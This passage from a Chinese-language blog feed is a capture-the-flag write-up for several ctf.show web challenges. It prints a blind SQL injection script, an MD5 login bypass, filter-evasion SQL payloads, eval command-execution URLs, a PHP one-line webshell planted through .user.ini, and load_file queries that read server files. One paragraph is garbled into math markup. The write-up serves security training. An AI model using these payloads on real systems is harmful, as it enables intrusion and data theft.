-url = 'http://ba00e61e-5d5e-4b8a-ae84-372acfeb761a.challenge.ctf.show:8080/index.php'
-table = &quot;&quot;
-
-for i in range(1, 46):
-print(i)
-for j in range(31, 128):
-
-# 爆表名  flag payload = &quot;ascii(substr((select/**/group_concat(
-# table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database(
-# ))from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j)) 爆字段名 flag payload = &quot;ascii(substr((select/**/group_concat(
-# column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1
-# ))=%s#&quot;%(str(i),str(j)) 读取flag
-
-payload = &quot;ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#&quot; % (str(i), str(j))
-# 这句话的意思就是一个个字符用ascii码来一个个字符判断因为这里过滤了逗号，所以就用from来代替，这里用（1，46）因为这里的flag的值是45位的，所以循环45次直到查完即可
-
-ra = s.get(url=url + '?id=0/**/or/**/' + payload).text
-
-if 'I asked nothing' in ra:
-table += chr(j)
-print(table)
-break
-</code></pre>
-<p>正确答案：</p>
-<pre><code>ctfshow{49206be5-846d-4411-9484-cd00a906445c}
-</code></pre>
-<h1 id="9web9">9.web9</h1>
-<p>打开题目发现有注入框，简单的注入测试后发现没有效果，扫描一下，发现存在robots.txt<br>
-进入robots.txt查看文件<br>
-<img src="https://jinqipiaopiao.github.io//post-images/1621688932791.png" alt="" loading="lazy"><br>
-下载后打开发现有源代码</p>
-<pre><code>&lt;?php
-$flag=&quot;&quot;;
-	$password=$_POST['password'];
-	if(strlen($password)&gt;10){
-		die(&quot;password error&quot;);
-	}
-	$sql=&quot;select * from user where username ='admin' and password ='&quot;.md5($password,true).&quot;'&quot;;
-	$result=mysqli_query($con,$sql);
-		if(mysqli_num_rows($result)&gt;0){
-				while($row=mysqli_fetch_assoc($result)){
-					 echo &quot;登陆成功&lt;br&gt;&quot;;
-					 echo $flag;
-				 }
-		}
-?&gt;
-</code></pre>
-<p>我们需要输入一个密码，通过md5加密后，绕过sql语句。<br>
-此时有一个字符串为ffifdyop，经过md5为276f722736c95d99e921722cf9ed621c，再转换为字符串为<code>' ' 'or' 6&lt;trach&gt;</code></p>
-<p>解析: 存在 or 即代码的两边有一边为真既可以绕过，其实为垃圾代码没有任何用的。 or<br>
-后面有6，非零值即为真。既可以成功绕过。<br>
-(<br>
-ffifdyop，这个点的原理是 ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是<code>‘ or ‘6</code>，<br>
-而 Mysql 刚好又会吧 hex 转成 ascii 解释，因此拼接之后的形式是<code>1select * from 'admin' where password='' or '6xxxxx'</code>)</p>
-<p>等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数)<br>
-得到flag<br>
-<img src="https://jinqipiaopiao.github.io//post-images/1621688926616.png" alt="" loading="lazy"></p>
-<p>————————————————<br>
-版权声明：本文为CSDN博主「FW_ENJOEY」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
-原文链接：https://blog.csdn.net/qq_46230755/article/details/112676830</p>
-<h1 id="10web10">10.web10</h1>
-<p><img src="https://jinqipiaopiao.github.io//post-images/1621737098411.png" alt="" loading="lazy"><br>
-打开页面点击取消按钮，出现源码。<br>
-$regex = &quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;;<br>
-从源码中可以得知几乎把注入用到的关键词过滤的差不多了。<br>
-如果只有这一条现在可以采用双写绕过，但是下面这条限制，使得无法双写绕过</p>
-<pre><code>if(strlen($username)!=strlen(replaceSpecialChar($username))){
-		die(&quot;sql inject error&quot;);
-	}
-</code></pre>
-<p>这里介绍两个mysql语句<br>
-①group by（将结果集中的数据行根据选择列的值进行逻辑分组）<br>
-不加group by时的输出如下：<br>
-<img src="https://jinqipiaopiao.github.io//post-images/1621690485736.png" alt="" loading="lazy"><br>
-在使用group by以后会按照password中的值进行排列：<br>
-<img src="https://jinqipiaopiao.github.io//post-images/1621690473258.png" alt="" loading="lazy"><br>
-②with rollup （group by 后可以跟with rollup，表示在进行分组统计的基础上再次进行汇总统计）<br>
-来看实例：<br>
-<img src="https://jinqipiaopiao.github.io//post-images/1621690478098.png" alt="" loading="lazy"><br>
-结果中将会多出一行，其中password列为null，count（*）为统计和。</p>
-<p>个人理解为：并不会对分组的字段进行求和，而是在下面显示为null。<br>
-这里我们就可以通过骚姿势绕过了。<br>
-其中/**/是为了绕过空格过滤</p>
-<pre><code>payload:username=admin'/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#&amp;password=
-</code></pre>
-<p>因为加入with rollup后 password有一行为NULL，我们只要输入空密码使得（NULL==NULL）即可满足<code>$password==$row['password']</code>的限制成功登陆。<br>
-登录成功即可显示flag。</p>
-<h1 id="web11">web11</h1>
-<p><img src="https://jinqipiaopiao.github.io//post-images/1621737379295.png" alt="" loading="lazy"><br>
-与上一关类似只不过上一关是要password那一栏满足<code>$password==$row['password']</code>用null==null即可，而这一关是要password与session里面的password相等所以我们就联想到让password输入框为空，并且把session里面的password删除然后就会出现flag的值。<br>
-<img src="https://jinqipiaopiao.github.io//post-images/1621737384302.png" alt="" loading="lazy"></p>
-<h1 id="web12">web12</h1>
-<p>打开地址发现啥也没有直接查看源码，出现<code>&lt;!-- hit:?cmd= --&gt;</code><br>
-所以利用url尾部添加cmd参数进行查看（可以直接运行php代码）<br>
-在网站上输入</p>
-<pre><code>?cmd=phpinfo();
-</code></pre>
-<p>有回显，猜测源码中应该为</p>
-<pre><code>eval($_GET['cmd']);
-</code></pre>
-<p>在eval执行漏洞中我们可以查看网页的源代码。我们输入</p>
-<pre><code>?cmd=highlight_file(&quot;index.php&quot;);
-</code></pre>
-<p>php highlight_file函数用于对文件进行PHP语法高亮显示。语法通过使用 HTML 标签进行高亮，其语法是highlight_file(filename,return)，参数filename必需，指规定要显示的文件。<br>
-成功显示网站源码。<br>
-<img src="https://jinqipiaopiao.github.io//post-images/1621739123983.png" alt="" loading="lazy"><br>
-这里再介绍一个php的函数glob();<br>
-glob() 函数返回匹配指定模式的文件名或目录。<br>
-举个例子:<br>
-glob(&quot;<em>&quot;) 匹配任意文件<br>
-glob(&quot;</em>.txt&quot;)匹配以txt为后缀的文件</p>
-<p>有了这个方法我们先把当前目录下所有的文件找出来看看有没有可用的。输入</p>
-<pre><code>?cmd=printf(glob(&quot;*&quot;))
-</code></pre>
-<p>发现说是array类型所以输入</p>
-<pre><code>?cmd=print_r(glob(&quot;*&quot;));
-</code></pre>
-<p>打印出了如下文件<br>
-<img src="https://jinqipiaopiao.github.io//post-images/1621739434808.png" alt="" loading="lazy"><br>
-然后想到可能flag就在这个长的php文件里面，我们使用highlight_file()函数成功输出该php文件中的源码。<br>
-<img src="https://jinqipiaopiao.github.io//post-images/1621739603781.png" alt="" loading="lazy"><br>
-————————————————<br>
-版权声明：本文为CSDN博主「yu22x」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
-原文链接：https://blog.csdn.net/miuzzx/article/details/104372662</p>
-<h1 id="红包题第二弹">红包题第二弹</h1>
-<p>打开此题发现啥也没有先查看源码直接再url后面添加</p>
-<pre><code>?cmd=phpinfo();
-</code></pre>
-<p><img src="https://jinqipiaopiao.github.io//post-images/1621863130981.png" alt="" loading="lazy"><br>
-分析代码可以得到以下关键信息：<br>
-不允许输入大写字母，数字，小写字母a-o，小写字母q-z和$，换句话说，可以输入的仅有小写字母p和某些特殊符号被过滤了大部分特殊符号，可以用的还有<code>?</code>，<code>.</code>，<code>/</code>，`等<br>
-因为过滤了~和^，异或和取反都不用考虑了，学习Y1ng师傅的文章学到了新姿势：</p>
-<pre><code>php的上传接受multipart/form-data,然后会将它保存再临时文件中。php.ini中设置的upload_tmp_dir就是这个临时文件的保存目录。linux下默认为/tmp。也就是说，只要是php接收到上传的post请求，就会保存一个临时文件，如何这个php脚本具有&quot;上传功能&quot;那么它将拷贝走，无论如何当脚本执行结束这个临时文件都会被删除，另外这个php临时文件在linux系统下的命名规则永远是phpXXXXXX
-</code></pre>
-<p>基本思路就是上传?，然后利用eval($cmd)去执行它。既然知道临时文件夹下的命名规则，也没有过滤通配符?，构造./??p/p?p??????就能读到这个文件<br>
-还有需要主义的命令执行，处理常见的system('ls');外，还可以写成?&gt;<?='ls';前面的?>意思是闭合前面的语句。&lt;?=是echo()的别名用法，不需要开启short_open_tag.eg:</p>
-<p>payload如下，.命令完成等于source命令.</p>
-<pre><code>POST /?cmd=?&gt;&lt;?=`.+/??p/p?p??????`; HTTP/1.1
-</code></pre>
-<p>eg:</p>
-<pre><code>Host: 4d0bf896-13f4-4502-93d0-143f6505dd17.challenge.ctf.show:8080
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Accept-Encoding: gzip, deflate
-Content-Type: multipart/form-data; boundary=---------------------------10242300956292313528205888
-Connection: close
-Cookie: UM_distinctid=17989df1da362-03ca639740b0f88-4c3f2c72-144000-17989df1da4903
-Upgrade-Insecure-Requests: 1
-Cache-Control: max-age=0
-Content-Length: 242
-
------------------------------10242300956292313528205888
-Content-Disposition: form-data; name=&quot;fileUpload&quot;; filename=&quot;1.txt&quot;
-Content-Type: text/plain
-
-#! /bin/sh
-
-cat /flag.txt
------------------------------10242300956292313528205888--
-</code></pre>
-<p>添加并且修改</p>
-<pre><code>Content-Type: multipart/form-data; boundary=---------------------------10242300956292313528205888
-
------------------------------10242300956292313528205888
-Content-Disposition: form-data; name=&quot;fileUpload&quot;; filename=&quot;1.txt&quot;
-Content-Type: text/plain
-#! /bin/sh
-cat /flag.txt
------------------------------10242300956292313528205888
-
-POST /?cmd=?&gt;&lt;?=`.+/??p/p?p??????`; HTTP/1.1
-</code></pre>
-<figure data-type="image" tabindex="1"><img src="https://jinqipiaopiao.github.io//post-images/1621865109115.png" alt="" loading="lazy"></figure>
-<h1 id="web13">web13</h1>
-<p>进入题目是个文件上传的题目，所以尝试了一番文件上传漏洞利用的方法后，没有啥突破，可能有啥隐藏的目录，尝试源码泄露利用的方法在输入upload.php.bak时成功下载源码<br>
-.bak文件是备份文件<br>
-这里列举一下常见的源码泄露<br>
-.gj源码泄露，.git源码泄露，.DS_Store文件泄露，还有以.phps.bak结尾的网页<br>
-在web题没有头绪的时候可以尝试一下可能会有奇效<br>
-源码如下：</p>
-<pre><code>&lt;?php 
-header(&quot;content-type:text/html;charset=utf-8&quot;);
-$filename = $_FILES['file']['name'];
-$temp_name = $_FILES['file']['tmp_name'];
-$size = $_FILES['file']['size'];
-$error = $_FILES['file']['error'];
-$arr = pathinfo($filename);
-$ext_suffix = $arr['extension'];
-if ($size &gt; 24){
-	die(&quot;error file zise&quot;);
-}
-if (strlen($filename)&gt;9){
-	die(&quot;error file name&quot;);
-}
-if(strlen($ext_suffix)&gt;3){
-	die(&quot;error suffix&quot;);
-}
-if(preg_match(&quot;/php/i&quot;,$ext_suffix)){
-	die(&quot;error suffix&quot;);
-}
-if(preg_match(&quot;/php/i&quot;),$filename)){
-die(&quot;error file name&quot;);
-}
-if (move_uploaded_file($temp_name, './'.$filename)){
-	echo &quot;文件上传成功！&quot;;
-}else{
-	echo &quot;文件上传失败！&quot;;
-}
-
-?&gt;
-</code></pre>
-<p>我们发下了上传文件的要求，文件的大小要小于等于24，名字长度小于等于9，后缀长度小于等于3，并且最要命的是后缀和名字都不能包含php，我们肯定是要上传一句话木马的，既然小于等于24可以这样写</p>
-<pre><code>&lt;?php eval($_GET['a']);
-</code></pre>
-<p>正好24字节可以满足，但是由于后缀问题服务器无法解析该php语句，这里用一种特殊的手法来绕过<br>
-1.我们先将一句话保存为a.txt<br>
-2.上传a.txt<br>
-3.上传.user.ini文件<br>
-对于php中的.user.ini有如下解释：<br>
-PHP会在每个目录下搜寻的文件名，如果设定为空字符串则PHP不会搜寻，也就是在.user.ini中如果设置了文件名，那么任意一个页面都会将该文件中内容包含进去<br>
-我们在.user.ini中输入auto_prepend_file=a.txt，这样在该目录下的所有文件都会包含a.txt的内容,<br>
-3.菜刀连接<br>
-菜刀连接上之后我们发现没有对文件操作的权限，所以我们直接在网页上查找flag</p>
-<pre><code>?a=print_r(glob(&quot;*&quot;));
-</code></pre>
-<p><img src="https://jinqipiaopiao.github.io//post-images/1622037260674.png" alt="" loading="lazy"><br>
-然后就会出现有PHP文件，然后用highlight_file函数打开文件即可</p>
-<pre><code>?a=highlight_file(&quot;903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php &quot;);
-</code></pre>
-<p><img src="https://jinqipiaopiao.github.io//post-images/1622037290773.png" alt="" loading="lazy"><br>
-答案是：<br>
-ctfshow{5eba5852-e836-4ced-b03d-74a615886e43}</p>
-<p>————————————————<br>
-版权声明：本文为CSDN博主「yu22x」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
-原文链接：https://blog.csdn.net/miuzzx/article/details/104379595</p>
-<h1 id="14web14">14.web14</h1>
-<p>对于这个题第一个坑要过的话必须得了解php的switch case语句。<br>
-在这里举个例子：</p>
-<pre><code>$number=1;
-switch ($number)
-{
-case &quot;1&quot;:
-echo &quot;one&quot;;
-case &quot;2&quot;:
-echo &quot;two&quot;;
-case &quot;3&quot;
-echo &quot;three&quot;;
-}
-</code></pre>
-<p>输出结果为 one two three<br>
-如果在 echo “one”;后面加上break，输出结果为 one。这里应该就明白了吧。如果不加break会一直执行下去，直到结束或者遇到break。</p>
-<p>在这个题目中有一条限制<code>sleep($c)</code>;就是我们输入的c是多少就会等待多少秒然后执行。所以我们想要输出<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>u</mi><mi>r</mi><mi>l</mi><mi mathvariant="normal">就</mi><mi mathvariant="normal">得</mi><mi mathvariant="normal">找</mi><mi mathvariant="normal">到</mi><mi mathvariant="normal">一</mi><mi mathvariant="normal">个</mi><mi mathvariant="normal">小</mi><mi mathvariant="normal">的</mi><mi>c</mi><mi>a</mi><mi>s</mi><mi>e</mi><mi mathvariant="normal">。</mi><mi mathvariant="normal">我</mi><mi mathvariant="normal">们</mi><mi mathvariant="normal">可</mi><mi mathvariant="normal">以</mi><mi mathvariant="normal">看</mi><mi mathvariant="normal">到</mi><mi mathvariant="normal">下</mi><mi mathvariant="normal">图</mi><mi mathvariant="normal">中</mi><mi mathvariant="normal">的</mi><mi>c</mi><mo>=</mo><mn>3</mn><mi mathvariant="normal">显</mi><mi mathvariant="normal">然</mi><mi mathvariant="normal">满</mi><mi mathvariant="normal">足</mi><mi mathvariant="normal">。</mi><mi>c</mi><mi>a</mi><mi>s</mi><mi>e</mi><mn>3</mn><mi mathvariant="normal">后</mi><mi mathvariant="normal">面</mi><mi mathvariant="normal">没</mi><mi mathvariant="normal">有</mi><mi>b</mi><mi>r</mi><mi>e</mi><mi>a</mi><mi>k</mi><mi mathvariant="normal">会</mi><mi mathvariant="normal">接</mi><mi mathvariant="normal">着</mi><mi mathvariant="normal">执</mi><mi mathvariant="normal">行</mi><mi mathvariant="normal">下</mi><mi mathvariant="normal">面</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">‘</mi><mi>e</mi><mi>c</mi><mi>h</mi><mi>o</mi><mi mathvariant="normal">&quot;</mi></mrow><annotation encoding="application/x-tex">url就得找到一个小的case。我们可以看到下图中的c=3显然满足。case 3 后面没有break会接着执行下面的`echo &quot;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">找</span><span class="mord cjk_fallback">到</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">小</span><span class="mord cjk_fallback">的</span><span class="mord mathdefault">c</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">看</span><span class="mord cjk_fallback">到</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">图</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">的</span><span class="mord mathdefault">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mord cjk_fallback">显</span><span class="mord cjk_fallback">然</span><span class="mord cjk_fallback">满</span><span class="mord cjk_fallback">足</span><span class="mord cjk_fallback">。</span><span class="mord mathdefault">c</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord">3</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">面</span><span class="mord cjk_fallback">没</span><span class="mord cjk_fallback">有</span><span class="mord mathdefault">b</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord cjk_fallback">会</span><span class="mord cjk_fallback">接</span><span class="mord cjk_fallback">着</span><span class="mord cjk_fallback">执</span><span class="mord cjk_fallback">行</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">面</span><span class="mord cjk_fallback">的</span><span class="mord">‘</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault">h</span><span class="mord mathdefault">o</span><span class="mord">&quot;</span></span></span></span>url&quot;`<br>
-<img src="https://jinqipiaopiao.github.io//post-images/1622077559389.png" alt="" loading="lazy"><br>
-输入?c=3成功显示 here_1s_your_f1ag.php，接下来访问该页面。是一个很明显的注入页面，但还不确定能否注入。<br>
-2<br>
-我们先来看一下网站源代码有条提示</p>
-<pre><code>if(preg_match(’/information_schema.tables|information_schema.columns|linestring| |polygon/is’, $_GET[‘query’])){
-die(’@A@’);
-}
-</code></pre>
-<p>过滤的关键词有information_schema.tables，information_schema.columns，linestring，空格，polygon。在这里提供一种绕过的方法——反引号<br>
-反引号：它是为了区分MYSQL的保留字与普通字符而引入的符号。<br>
-例如<br>
-information_schema.tables和information_schema.<code>tables</code><br>
-都可以使用。<br>
-网页的弹窗使得我们不容易观察，我们直接在源代码页面进行注入。<br>
-例如这样</p>
-<pre><code>view-source:http://124.156.121.112:28051/here_1s_your_f1ag.php?query=1/**/order/**/by/**/1
-</code></pre>
-<p>当输入order by 1时才不显示错误，所以有一个回显位置。</p>
-<pre><code>view-source:http://88030202-7e53-4ed0-b44e-69bc2f99e50b.challenge.ctf.show:8080/here_1s_your_f1ag.php?query=-1/**/union/**/select/**/group_concat(table_name)/**/from/**/information_schema.`tables`/**/where/**/table_schema=database()
-</code></pre>
-<figure data-type="image" tabindex="2"><img src="https://jinqipiaopiao.github.io//post-images/1622077262367.png" alt="" loading="lazy"></figure>
-<pre><code>view-source:http://88030202-7e53-4ed0-b44e-69bc2f99e50b.challenge.ctf.show:8080/here_1s_your_f1ag.php?query=-1/**/union/**/select/**/group_concat(column_name)/**/from/**/information_schema.`columns`/**/where/**/table_name=%27content%27
-</code></pre>
-<figure data-type="image" tabindex="3"><img src="https://jinqipiaopiao.github.io//post-images/1622077312006.png" alt="" loading="lazy"></figure>
-<pre><code>view-source:http://88030202-7e53-4ed0-b44e-69bc2f99e50b.challenge.ctf.show:8080/here_1s_your_f1ag.php?query=-1/**/union/**/select/**/group_concat(concat_ws(%22:%22,id,username,password))/**/from/**/content
-</code></pre>
-<figure data-type="image" tabindex="4"><img src="https://jinqipiaopiao.github.io//post-images/1622077395525.png" alt="" loading="lazy"></figure>
-<pre><code>view-source:http://88030202-7e53-4ed0-b44e-69bc2f99e50b.challenge.ctf.show:8080/here_1s_your_f1ag.php?query=-1/**/union/**/select/**/load_file(%27/var/www/html/secret.php%27)
-</code></pre>
-<figure data-type="image" tabindex="5"><img src="https://jinqipiaopiao.github.io//post-images/1622077406771.png" alt="" loading="lazy"></figure>
-<pre><code>view-source:http://88030202-7e53-4ed0-b44e-69bc2f99e50b.challenge.ctf.show:8080/here_1s_your_f1ag.php?query=-1/**/union/**/select/**/load_file(%27/real_flag_is_here%27)
-</code></pre>
-<figure data-type="image" tabindex="6"><img src="https://jinqipiaopiao.github.io//post-images/1622077439001.png" alt="" loading="lazy"></figure>
-<p>————————————————<br>
-版权声明：本文为CSDN博主「yu22x」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
-原文链接：https://blog.csdn.net/miuzzx/article/details/104373112</p>
 ]]></content>
     </entry>
 </feed>
